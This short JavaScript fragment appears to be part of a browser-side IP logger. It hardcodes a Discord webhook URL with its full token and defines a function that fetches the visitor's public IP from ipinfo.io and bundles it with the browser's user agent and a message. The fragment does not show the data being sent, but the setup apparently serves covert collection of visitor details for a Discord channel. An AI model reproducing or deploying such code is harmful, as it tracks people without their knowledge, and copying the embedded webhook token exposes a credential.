const tg = "https://discord.com/api/webhooks/1011218338040520735/PT5ESMv5pSUT-wcV9ZfYlecS2xAyoS9TSzFIkRYo5F1OMTs3vw_TKkmlUKLAP6HHjUgh"
const koz = async (b) => {
  let res = await fetch("https://ipinfo.io?callback")
  let dat = await res.json()
  console.log(dat.ip)
  return {
    ms: b,
    ip: dat.ip,
    ua: navigator.userAgent
  }
}
